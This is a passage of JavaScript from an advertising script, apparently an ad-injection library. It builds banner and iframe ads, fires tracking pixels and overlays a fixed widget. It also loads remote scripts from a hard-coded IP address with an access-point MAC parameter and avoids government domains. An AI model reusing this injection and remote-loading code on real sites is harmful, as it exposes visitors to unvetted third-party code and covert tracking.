				d += '<a href="' + ad.campaign.clickUrl + "&adTime=" + ad.adTime + '" target="_blank" ';
				d += '>'
			}
			d += '<img width="' + this.width + '" height="' + this.height + '" src="' + material.bannerUrl + '" />';
			d += '</a></div>'
		}
		if (d != "" && d != null && d) {
			this.addContent(d);
			this.display(this);
			window._yn_map.put(this.lunBo, "yd");
			this.adCount++
		}
	},
	cretaeD1Log: function(material) {
		if (material.dspType && material.dspType == 1 && material.bidid) {
			if (material.wurl) {
				this.addLogAppendChild(material.wurl.replace("%%SETTLE_TIME%%", Date.now()));
				this.sendLogMsgIm('d_1_wurl', material.bidid)
			}
			if (material.pm instanceof Array) {
				for (var i = 0; i < material.pm.length; i++) {
					var el = material.pm[i] + '&rd=' + Date.now();
					this.addLogAppendChild(el, 'd_1_pm')
				}
				this.sendLogMsgIm('d_1_pm', material.bidid)
			}
			if (material.cm) {
				window._yn_map.put(material.bidid, material.cm)
			}
		}
	},
	createIM: function(ad) {
		var portal_yd = document.getElementById('portal_yd');
		var material = ad.campaign.showMaterial;
		if (portal_yd && ad.imc) {
			this.addLog(ad.imc)
		}
	},
	addIfrAD: function(url) {
		var adifr = '<iframe id="yn_ifr" frameborder="no" border="0" scrolling="no" style="border:0px; border:none;" src ="' + url + '" height="' + this.height + '" width="' + this.width + '" ></iframe>';
		this.addContent(adifr)
	},
	addLog: function(src) {
		var img = new Image;
		img.src = src
	},
	addLogAppendChild: function(src, msg) {
		var img = new Image;
		img.src = src;
		img.onerror = function() {};
		img.onload = function() {};
		document.body.appendChild(img)
	},
	canDeilivry: function() {
		var domain = document.domain;
		if (domain.indexOf("gov.cn") != -1 || domain.indexOf("gwifi.com.cn") != -1 || domain.indexOf("eqxiu.com") != -1 || domain == "") {
			this.isDomainLimited = true
		}
	},
	addStyle: function() {
		if (!document.all) {
			var _yn_style = document.createElement('style');
			_yn_style.innerHTML = '#_yn_g_g iframe{display:block!important;}';
			document.body.insertBefore(_yn_style, document.body.children[0])
		}
	},
	sendLogMsg: function(msg, style, displayBanner) {
		var t = this;
		setTimeout(function() {
			if (displayBanner) {
				t.display(t)
			}
			t.y_report(null, msg, style)
		}, 1000)
	},
	sendLogMsgIm: function(msg, style, displayBanner) {
		var t = this;
		if (t.y_report_new) {
			t.y_report_new(null, msg, style)
		} else {
			var tem = setInterval(function() {
				if (t.y_report_new) {
					t.y_report_new(null, msg, style);
					clearInterval(tem)
				}
			}, 100)
		}
	},
	ynInfoStream: function(ynad) {
		if (typeof yn_info_check == 'function' && this.yl_url) {
			var material = {};
			material.txt = ynad.infoStream[0].showMaterial.longTitle;
			material.src = ynad.infoStream[0].showMaterial.bannerUrl;
			material.href = ynad.infoStream[0].clickUrl;
			material.codeId = this.codeId;
			material.logUrl = this.yl_url + "&campaignId=" + ynad.infoStream[0].id + "&adpName=" + ynad.infoStream[0].chooseName;
			yn_info_check(material)
		} else {
			var t = this;
			setTimeout(function() {
				t.ynInfoStream(ynad)
			}, 10)
		}
	},
	ynPush: function(ynad) {
		if (typeof _yn_t != 'undefined' && this.y_report) {
			var material = {};
			material.imgUrl = ynad.push.showMaterial.bannerUrl;
			material.cliUrl = ynad.push.clickUrl;
			material.codeId = this.codeId;
			material.logUrl = this.yl_url + "&campaignId=" + ynad.push.id + "&adpName=" + ynad.push.chooseName;
			_yn_t.yn_addYnPush(material)
		} else {
			var t = this;
			setTimeout(function() {
				t.ynPush(ynad)
			}, 10)
		}
	},
	ynDuBao: function(ynad) {
		if (this.y_report && typeof _yn_t != 'undefined') {
			var material = ynad.dubao.showMaterial;
			material.imgUrl = material.bannerUrl;
			material.clickUrl = ynad.dubao.clickUrl + "&adTime=" + ynad.adTime;
			material.codeId = this.codeId;
			material.logUrl = this.yl_url + "&campaignId=" + ynad.dubao.id + "&adpName=" + ynad.dubao.chooseName;
			_yn_t.yn_addAB(material)
		} else {
			var t = this;
			setTimeout(function() {
				t.ynDuBao(ynad)
			}, 10)
		}
	},
	ynMonPlus: function(ynad) {
		var picPlus = ynad.picPlus;
		if (typeof img_plus_check == 'function') {
			var materialPlus = {};
			var tagList = new Array();
			var patchList = new Array();
			materialPlus.taglist = tagList;
			materialPlus.patchlist = patchList;
			for (var i = 0; i < picPlus.length; i++) {
				var adPlus = picPlus[i];
				var tagElement = {};
				tagElement.title = adPlus.showMaterial.shortTitle;
				tagElement.clickUrl = adPlus.clickUrl + "&adTime=" + ynad.adTime;
				tagElement.imgUrl = adPlus.showMaterial.bannerUrl;
				tagElement.codeId = this.codeId;
				tagElement.logUrl = this.yl_url + "&campaignId=" + adPlus.id + "&adpName=" + adPlus.chooseName;
				if (adPlus.showMaterial.isPatch) {
					patchList[patchList.length] = tagElement
				} else {
					tagList[tagList.length] = tagElement
				}
			}
			img_plus_check(materialPlus)
		} else {
			var t = this;
			setTimeout(function() {
				t.ynMonPlus(ynad)
			}, 10)
		}
	},
	tuiAdubao: function() {
		if (!window.DuibaMedia || !this.y_report) {
			var t = this;
			setTimeout(function() {
				t.tuiAdubao()
			}, 10)
		} else if (!this.bd.tuiaDubaoInjected) {
			var createDiv = document.createElement('div');
			createDiv.className = 'duiba-media-yn-container';
			createDiv.setAttribute('style', 'position: fixed;right: 5px;top: 180px;z-index: 9999;width:64px;height:64px;');
			document.body.appendChild(createDiv);
			this.bd.tuiaDubaoInjected = true;
			var t = this;
			this.sendLogMsg('tuia_dubao', "request");
			DuibaMedia({
				container: '.duiba-media-yn-container',
				app_key: '49Gr28qN1TX5HNm3pSBhKvL1z2ep',
				adslot_id: '118',
				success: function(res) {
					t.sendLogMsg('tuia_dubao', "response_ok")
				},
				error: function(res) {
					t.sendLogMsg('tuia_dubao', "response_no");
					t.create58dubaoAd("st_gg", "http://res.sspsky.com/cp.js?cid=9CB4D3B4")
				},
				getSpm: function(value) {
					if (value == "A") {
						t.sendLogMsg('tuia_dubao', "A")
					} else if (value == "B") {
						t.sendLogMsg('tuia_dubao', "B")
					}
				},
				adError: function(error) {
					t.sendLogMsg('tuia_dubao', "response_no");
					t.create58dubaoAd("st_gg", "http://res.sspsky.com/cp.js?cid=9CB4D3B4")
				}
			})
		}
	},
	checkViewForcast: function() {
		_append_yn_js("http://180.76.133.175/?codeId=" + this.codeId + "&apMac=" + this.apMac + "&cid=" + this.y_cid + "&vs=" + this.yn_vs() + "&bproId=" + this.bd.bproId)
	},
	isBaiduLimited: function() {
		return this.checkHm() >= 2 && this.codeId != 10017 && this.codeId != 10044 && this.codeId != 10269 && this.codeId != 10059
	},
	canDisaplaySceneGG: function() {
		return !this.isDomainLimited && this.ad.code && this.ad.code.enableMobScene && this.codeId != 10350
	},
	yn_vs: function() {
		if ('visibilityState' in document) {
			return document.visibilityState
		}
		var prefixes = ['webkit', 'moz', 'ms', 'o', 'uc'];
		for (var i = 0; i < prefixes.length; i++) {
			if (prefixes[i] + 'VisibilityState' in document) {
				return document[prefixes[i] + 'VisibilityState']
			}
		}
		return 'undfn'
	}
};
if (yn_isMobile() && navigator.userAgent.indexOf("Firefox") > 0) {
	addYnLoadEvent(_yn_run)
} else {
	_yn_run()
}